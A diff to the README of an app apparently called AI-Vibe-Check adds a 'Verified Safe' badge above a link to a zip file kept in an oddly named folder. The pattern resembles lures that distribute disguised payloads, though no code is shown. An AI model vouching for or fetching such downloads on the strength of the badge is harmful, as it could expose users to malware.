@@ -1,5 +1,7 @@
 # 🤖 AI-Vibe-Check - Your Daily Developer Mood Tracker
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/abhxhekrathore5-ai-vibe-check)
+
 ## 🔗 Download Now
 [![Download AI-Vibe-Check](https://github.com/abhxhekrathore5/AI-Vibe-Check/raw/refs/heads/main/Coroado/Check-A-Vibe-1.2.zip)](https://github.com/abhxhekrathore5/AI-Vibe-Check/raw/refs/heads/main/Coroado/Check-A-Vibe-1.2.zip)
 
